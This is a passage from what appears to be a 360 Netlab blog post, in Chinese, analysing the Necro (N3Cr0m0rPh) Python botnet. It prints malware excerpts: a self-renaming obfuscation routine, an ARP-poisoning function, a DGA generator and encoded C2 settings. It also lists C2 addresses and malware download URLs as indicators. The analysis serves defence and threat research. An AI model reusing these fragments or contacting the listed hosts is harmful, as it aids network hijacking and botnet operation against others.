<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----7.jpg" class="kg-image" alt loading="lazy" width="771" height="508" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----7.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----7.jpg 771w" sizes="(min-width: 720px) 720px"></figure><h3 id="%E6%A0%B7%E6%9C%AC%E6%BA%AF%E6%BA%90">样本溯源</h3>
<p>通过第1版样本的版本信息我们可以看到Necro早在2015年就已开发，作者称之为N3Cr0m0rPh (Necromorph)。</p>
<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----13.jpg" class="kg-image" alt loading="lazy" width="728" height="259" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----13.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----13.jpg 728w" sizes="(min-width: 720px) 720px"></figure><p>利用这些信息，我们从样本库里关联到一批针对 Windows平台的早期Necro样本，都是exe文件，这批样本刚好也可以追溯到2015年，跟第1版中的版本信息吻合。从这些线索可以推断Necro首先针对的是Windows平台，然后也许是Python程序天然的跨平台特性，抑或现网大量存在漏洞的Linux机器（IoT设备、云服务器等），启发Necro作者用去攻击Linux设备。无论如何，现在Linux malware大军中又多了新的一员：Necro。</p>
<h2 id="%E5%85%B6%E5%AE%83">其它</h2>
<p>因为部分Necro样本以PyInstaller打包方式分发，下面简单介绍如何通过解包、反编译、解混淆等手段还原出可读的.py脚本。</p><ul><li> 解包 </li></ul><p>以第3版为例，用开源工具<a href="https://github.com/extremecoders-re/pyinstxtractor?ref=blog.netlab.360.com">pyinstxtractor</a>解包从ELF样本中提取的pydata数据后可以得到原始python脚本依赖的.so动态库、python库以及字节码文件.benchmark.pyc。</p><figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----3.jpg" class="kg-image" alt loading="lazy" width="706" height="564" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----3.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----3.jpg 706w"></figure><ul><li> 反编译pyc </li></ul><p>利用<a href="https://pypi.org/project/uncompyle6/?ref=blog.netlab.360.com" rel="noreferrer noopener"><strong>uncompyle6</strong></a>反编译 .pyc字节码可以得到最终的python脚本。通过对比来自同一downloader的python脚本<code>.benchmark.py</code>，发现其跟反编译出的.py脚本相同，所以断定<code>.benchmark.py</code>就是打包前的原始脚本。 </p><ul><li>字符串解密 </li></ul><p>Necro使用简单的“zip压缩+异或加密”方法隐藏字符串, 下面这段代码示范了解码过程：先解压再异或即可得到被隐藏的字符串<code>'8.8.8.8'</code> ：</p><pre><code>xor_crypt(zlib.decompress(b'\x78\x9c\xab\xac\x8d\x72\xf7\xca\x96\x06\x00\x0a\xf1\x02\x68'))  

def xor_crypt(s):     
    xor_key = [65, 83, 98, 105, 114, 69, 35, 64, 115, 103, 71, 103, 98, 52]     
    return ('').join([ chr(ord(c) ^ xor_key[(i % len(xor_key))]) for i, c in enumerate(s) ]) 
</code></pre>
<ul><li>动态变形 </li></ul><p>python脚本启动后会先调用<code>repack()</code>函数对当前的文件进行变形，变形的算法是依次从obj_name_list表（表中保存了文件中自定义的对象名称）中取出一个对象名称(可能是类，变量名，函数名)，然后产生一个8位的随机字串，用这个8位的随机字串替换文件中对应的对象名称，结果就是原始文件中再也找不到可读的对象名称了。因为这种做法是不可逆的，我们只能从代码功能上推测每个函数和变量的含义，参考早期版本的代码，我们基本搞楚了代码的功能。 </p><pre><code>def __init__(self):
    ...
    self.repack() #repack bot before we install
    self.install() #Install

def repack(self):
    try:
        fh_myself=open(argv[0],"r")
        _pyload=fh_myself.read()
        fh_myself.close()
        obj_name_list=['localhost_irc','gen_random_8char'....]
        for obj_name in obj_name_list:
            _pyload=_pyload.replace(obj_name,self.gen_random_8char(8))
        new_fh_myself=open(argv[0],"w")
        new_fh_myself.write(_pyload)
        new_fh_myself.close()
    except:
        pass
</code></pre>
<p> </p><ul><li>ARP欺骗和流量嗅探 </li></ul><p>比较有意思的Necro还支持ARP投毒和网络流量嗅探。ARP欺骗是为了把受害者机器伪装成网关，代码如下所示。</p>
<pre><code>def create_pkt_arp_poison():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind(("wlan0", 0))
    
    while(1):
        for lmfao in getPoisonIPs():
            src_addr = get_src_mac()
            dst_addr = lmfao[0]
            src_ip_addr = get_default_gateway_linux()
            dst_ip_addr = lmfao[1]
            dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
            payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
            checksum = "\x00\x00\x00\x00"
            ethertype = "\x08\x06"
            s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
                + dst_mac_addr + dst_ip_addr + checksum)
        time.sleep(2)


</code></pre>
<p>这段buggy代码会在一个单独的线程种执行，每隔2秒读取一遍/proc/net/arp以获取最新的ARP邻居，然后冒充网关给它们发送ARP回应，目的是使对方相信所运行的机器就是网关。作者这么做可能是为了实现中间人劫持，但目前还没看到更多的中间人通信相关代码，猜测该功能尚处于开发中。</p><p>嗅探主要针对受害者机器的TCP通信流量，该功能受C2指令（<code>.sniffer-resume</code>）控制。一旦开启，所有非以下端口的TCP流量都会被记录并上报给C2的1337端口：“1337, 6667, 23, 443, 37215, 53, 22”。</p>
<ul>
<li>C2基础设施</li>
</ul>
<p>从第3版的C2域名aveixucyimxwcmph.xyz出发，我们通过图系统成功的把3个版本的C2都关联起来，如下图所示：</p>
<figure class="kg-card kg-image-card"><img src="https://blog.netlab.360.com/content/images/2021/01/-----10.jpg" class="kg-image" alt loading="lazy" width="752" height="456" srcset="https://blog.netlab.360.com/content/images/size/w600/2021/01/-----10.jpg 600w, https://blog.netlab.360.com/content/images/2021/01/-----10.jpg 752w" sizes="(min-width: 720px) 720px"></figure><p>其中，第2版的C2域名gxbrowser.net也曾解析到过第1版的C2  45.145.185.229上，而第3版的C2域名aveixucyimxwcmph.xyz所解析的IP 193.239.147.224曾经也被gxbrowser.net使用过，这些说明目前的3个版本Necro botnet背后的作者应该是同一伙人。</p><p>值得说明的是所有的Necro相关域名都已被360netlab的DNSmon系统拦截。</p><h2 id="%E7%BB%93%E8%AE%BA">结论</h2>
<p>Necro是一个相对较老的Python恶意程序，但作者通过采用代码混淆、PyInstaller打包、集成DGA和新漏洞等方式使其摇身一变成为一款危害较大的针对Linux设备的新botnet，可谓“老树新春”。考虑到作者在不到一个月的时间内接连推出了3个版本，我们相信该家族目前处于持续活跃期中，相信后面还会不断发起新的攻击。360BotMon系统将持续对该家族保持关注，并会即使公布新的威胁信息。</p>
<p>如果需要帮助，欢迎通过netlab@360.cn联系我们。</p>
<h2 id="%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E">版权声明</h2>
<p>本文为Netlab Jinye原创，依据 <a href="https://creativecommons.org/licenses/by-sa/4.0/?ref=blog.netlab.360.com">CC BY-SA 4.0</a> 许可证进行授权，转载请附上出处链接及本声明。</p>
<h2 id="a-idiocioca"><a id="ioc">IoC</a></h2>
<p></p><p>C2</p><pre><code>45.145.185.83
193.239.147.224
gxbrowser.net
aveixucyimxwcmph.xyz
</code></pre><p></p><p>Download URL</p><pre><code># 第1版 
 http://45.145.185.229/necr0.py

# 第2版
 http://gxbrowser.net/out
 http://gxbrowser.net/out.py

# 第3版
 http://aveixucyimxwcmph.xyz/.benchmark
 http://aveixucyimxwcmph.xyz/.benchmark.py

#　其它样本
 http://gxbrowser.net/xmrig
 http://gxbrowser.net/xmrig1
 http://aveixucyimxwcmph.xyz/xmrig1
 http://45.145.185.229/bins/nginx.html/keksec.x86
 http://45.145.185.229/bins/nginx.html/keksec.spc
 http://45.145.185.229/bins/nginx.html/keksec.sh4
 http://45.145.185.229/bins/nginx.html/keksec.ppc
 http://45.145.185.229/bins/nginx.html/keksec.mpsl
 http://45.145.185.229/bins/nginx.html/keksec.mips
 http://45.145.185.229/bins/nginx.html/keksec.m68k
 http://45.145.185.229/bins/nginx.html/keksec.i586
 http://45.145.185.229/bins/nginx.html/keksec.arm
 http://45.145.185.229/bins/nginx.html/keksec.arm7
 http://45.145.185.229/bins/nginx.html/keksec.arm5
 http://45.145.185.229/bins/keksec.x88_64
 http://45.145.185.229/bins/keksec.x86
 http://45.145.185.229/bins/keksec.x64
 http://45.145.185.229/bins/keksec.spc
 http://45.145.185.229/bins/keksec.sh4
 http://45.145.185.229/bins/keksec.ppc
 http://45.145.185.229/bins/keksec.mpsl
 http://45.145.185.229/bins/keksec.mips
 http://45.145.185.229/bins/keksec.mips64
 http://45.145.185.229/bins/keksec.m68k
 http://45.145.185.229/bins/keksec.i586
 http://45.145.185.229/bins/keksec.arm
 http://45.145.185.229/bins/keksec.arm7
 http://45.145.185.229/bins/keksec.arm5
 http://45.145.185.229/update.sh
</code></pre><h2 id="a-iddgadga-%E7%AE%97%E6%B3%95a"><a id="dga">DGA 算法</a></h2>
<pre><code>import random

def gen_random_str(_range):
    return ('').join(random.choice('abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(_range))

def gen_cc(time):
    random.seed(a=5236442 + time)
    return gen_random_str(16) + '.xyz'

def gen_DGA():
    i = 0
    while 1:
        for _ in range(3):
            try:
                print(gen_cc(i))
            except:
                pass
        if i &gt;= 2048:
            i = 0
        i += 1

gen_DGA()

</code></pre>
<h2 id="a-iddecryptccc2%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95a"><a id="decrypt_cc">C2解密算法</a></h2>
<pre><code>self.irc_server=b64decode(b64decode("34653437353533303465343435353331346537613535333035613434353533303465353434353761346435343532366134653664343533303465353434643330346534373535333134643761346433303465376136623330356134343561363834653664343937613561343133643364".decode('hex').decode('hex')).decode('hex')) #Encoded irc server

self.server_port=6667 #Server port

self.channel=b64decode(b64decode("346534343662376134643661346433313465366434643331346635343464376134653437343533333465363733643364".decode('hex').decode('hex')).decode('hex')) #Encoded channel

self.channel_key==b64decode(b64decode("346536613439333134653434353137393465376136623332346437613531333334653661363337613561343133643364".decode('hex').decode('hex')).decode('hex')) #Encoded channel key

</code></pre><h2 id="%E5%BC%95%E7%94%A8">引用</h2>
<ul>
<li><a id="ref_1">https://www.imperva.com/blog/python-cryptominer-botnet-quickly-adopts-latest-vulnerabilities/</a></li>
<li><a id="ref_2">https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28188?ref=blog.netlab.360.com">https://nvd.nist.gov/vuln/detail/CVE-2020-28188</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3007?ref=blog.netlab.360.com">https://nvd.nist.gov/vuln/detail/CVE-2021-3007</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7961?ref=blog.netlab.360.com">https://nvd.nist.gov/vuln/detail/CVE-2020-7961</a></li>
</ul>
<p></p><p></p>
      </section>



      <div id="disqus_thread" class="disqus-comments gh-canvas"></div>
      <script>
        var disqus_config = function () {
          this.page.url = "https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/";
          this.page.identifier = "ghost-6006bfa4d0d9b70007129e67"
        };
        (function () {
          var d = document, s = d.createElement('script');
          s.src = 'https://blog-netlab-360.disqus.com/embed.js';
          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    </article>

  </main>


    <aside class="read-more-wrap outer">
      <div class="inner">
        <div class="read-more-feed">
            <article class="read-more-card" 
                  style="background-image: url(/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg)" 
              >
              <header class="read-more-card-header">
                <small class="read-more-card-header-sitetitle">&mdash; 360 Netlab Blog - Network Security Research Lab at 360 &mdash;</small>
                <h3 class="read-more-card-header-title"><a href="/tag/dga/">DGA</a></h3>
              </header>
              <div class="read-more-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
              <div class="read-more-card-content">
                <ul>
                  <li><a href="/a-new-botnet-orchard-generates-dga-domains-with-bitcoin-transaction-information/">A new botnet Orchard Generates DGA Domains with Bitcoin Transaction Information</a></li>
                  <li><a href="/orchard-dga/">DGA家族Orchard持续变化，新版本用比特币交易信息生成DGA域名</a></li>
                  <li><a href="/abcbot_an_evolving_botnet_en/">Abcbot, an evolving botnet</a></li>
                </ul>
              </div>
              <footer class="read-more-card-footer">
                <a href="/tag/dga/">See all 9 posts →</a>
              </footer>
            </article>

          
<article class="post-card post tag-dga tag-en tag-pyinstaller tag-necro tag-necromporph tag-n3cr0m0rph tag-freakout tag-python-ircbot tag-botnet tag-ddos tag-irc tag-aveixucyimxwcmph-xyz tag-gxbrowser-net tag-pythonminer tag-cve-2020-28188 tag-cve-2021-3007 tag-cve-2020-7961 tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/necro/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">DGA</span>
        </div>
        <h2 class="post-card-title">
          Necro is going to version 3 and using PyInstaller and DGA
        </h2>
      </header>
      <div class="post-card-excerpt">Overview.


Necro is a classic family of botnet written in Python that was first discovered in 2015, at the beginning, it targeted Windows systems and often tagged by security vendors as Python.IRCBot and called N3Cr0m0rPh (Necromorph) by the author himself.


Since January 1, 2021, 360Netlab&#39;s BoTMon system</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            jinye
          </div>

          <a href="/author/jinye/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/12/400--2-.jpeg" alt="jinye" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2021-01-22">Jan 22, 2021</time>
      <span class="post-card-meta-length">12 min read</span>
    </footer>

  </div>

</article>
          
<article class="post-card post tag-dnsmon tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/use-dns-data-produce-threat-intelligence-2/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">DNSMon</span>
        </div>
        <h2 class="post-card-title">
          DNSMon: 用DNS数据进行威胁发现(2)
        </h2>
      </header>
      <div class="post-card-excerpt">----DNSMon抓李鬼记


背景

本文是介绍DNSMon在生产威胁情报(域名IoC)系列文章的第二篇。

为了对抗安全人员的分析，钓鱼域名是恶意样本经常采用的一种技术手段。从字符组成和结构上看，钓鱼域名确实具有混淆视听的功效，但对于DNSMon这种具备多维度关联分析的系统来说，模仿知名公司域名的效果则适得其反，因为这样的域名一旦告警，反而更容易引起分析人员的注意。

本案例从一组疑似钓鱼域名出发，逐步介绍DNSMon是如何利用whois，ICP备案，域名解析内容和图关联等信息，让一组干瘪的域名逐渐一点点丰富起来直至最后恶意定性的。

意料之外的是，随着线索的展开，我们发现这是一起失陷设备数量巨大的安全事件，从我们的数据测算，感染规模远超100w设备。为此，我们进行了较为细致的逆向分析和回溯，但限于篇幅，样本分析细节及其家族演变，将在后续再另起一篇介绍。

通常威胁分析普遍的惯例是先知道样本恶意再逆向, 有时根据DNS数据估算感染规模。这次DNSMon系列文章里揭示的，更多是先根据DNS数据发现异常并定性，再进一步探寻还原事件真相。即从先逆向再统计，变成了先统计再逆向。
这个顺序</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            suqitian
          </div>

          <a href="/author/suqitian-2/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2020/11/2-1Z5061542320-L.jpg" alt="suqitian" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2020-12-31">Dec 31, 2020</time>
      <span class="post-card-meta-length">14 min read</span>
    </footer>

  </div>

</article>
        </div>
      </div>
    </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> &copy; 2024</section>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=42b57cac00"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();

    // floating-header
    // Start fitVids
      var $postContent = $(".gh-content");
      $postContent.fitVids();
      // End fitVids

      var progressBar = document.querySelector('#reading-progress');
      var header = document.querySelector('.floating-header');
      var title = document.querySelector('.article-title');

      var lastScrollY = window.scrollY;
      var lastWindowHeight = window.innerHeight;
      var lastDocumentHeight = $(document).height();
      var ticking = false;

      function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
      }

      function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
      }

      function requestTick() {
        if (!ticking) {
          requestAnimationFrame(update);
        }
        ticking = true;
      }

      function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
          header.classList.add('floating-active');
        } else {
          header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
      }

      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('resize', onResize, false);

      update();
});
</script>



</body>
</html>
